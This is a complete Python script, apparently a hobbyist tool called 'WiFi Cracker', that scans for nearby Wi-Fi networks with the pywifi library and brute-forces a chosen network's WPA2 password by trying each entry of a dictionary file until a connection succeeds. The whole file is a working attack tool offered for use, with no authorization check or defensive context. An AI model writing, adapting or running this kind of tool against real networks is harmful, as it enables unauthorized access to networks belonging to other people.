from pywifi import const, PyWiFi, Profile
import colorama
from colorama import Fore
from time import sleep
import optparse

colorama.init()

y = Fore.YELLOW
g = Fore.GREEN
r = Fore.RED
rs = Fore.RESET


def show_banner():
    banner = y + fr"""


            __          ___  __ _    _____                _             
            \ \        / (_)/ _(_)  / ____|              | |            
             \ \  /\  / / _| |_ _  | |     _ __ __ _  ___| | _____ _ __ 
              \ \/  \/ / | |  _| | | |    | '__/ _` |/ __| |/ / _ \ '__|
               \  /\  /  | | | | | | |____| | | (_| | (__|   <  __/ |   
                \/  \/   |_|_| |_|  \_____|_|  \__,_|\___|_|\_\___|_|   

                       {g}     ++ By KatakKentut ++ {y}                                              

               """

    return banner


def brute_force(ssid, get_password):
    interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = get_password
    interface.connect(interface.add_network_profile(profile))
    sleep(1)  # increase sleep if laptop slow

    if interface.status() == const.IFACE_CONNECTED:
        interface.remove_network_profile(profile)
        return True
    else:
        interface.remove_network_profile(profile)
        return False


if __name__ == '__main__':

    parser = optparse.OptionParser("usage %prog " + "-d <dictionary>")
    parser.add_option('--dictname', dest='pass_dict', type='string', help='specify dictionary file')
    (options, args) = parser.parse_args()

    if options.pass_dict is None:
        print(parser.usage)
        exit(0)

    else:
        pass_dict = options.pass_dict

        print(show_banner())
        wifi = PyWiFi()
        interface = wifi.interfaces()[0]

        print(g + "\n++++++ Scanning For In Range Wifi ++++++")

        interface.scan()
        sleep(8)
        result = interface.scan_results()

        print("")
        for number in range(len(result)):
            print(f"    {number + 1} >> {result[number].ssid}")
        print("")
        print("+" * 40)

        print(y)
        get_selected_wifi = int(input("\n + Select Wifi You Want To Brute Force: "))
        print("")
        select_wifi = result[get_selected_wifi - 1]  # get selected wifi with minus 1

        count = 0
        for password in open(pass_dict):
            password = password.strip("\n")
            count += 1

            if brute_force(select_wifi.ssid, password):  # If return True it'll show the password
                print(y, "")
                print("+" * 40)
                print(f" {g}PASSWORD CRACKED >>> {y}{password}")
                print("+" * 40)

                break
            else:  # if return false
                print(r, f" [{count}] Password Failed >> {y}{password}")
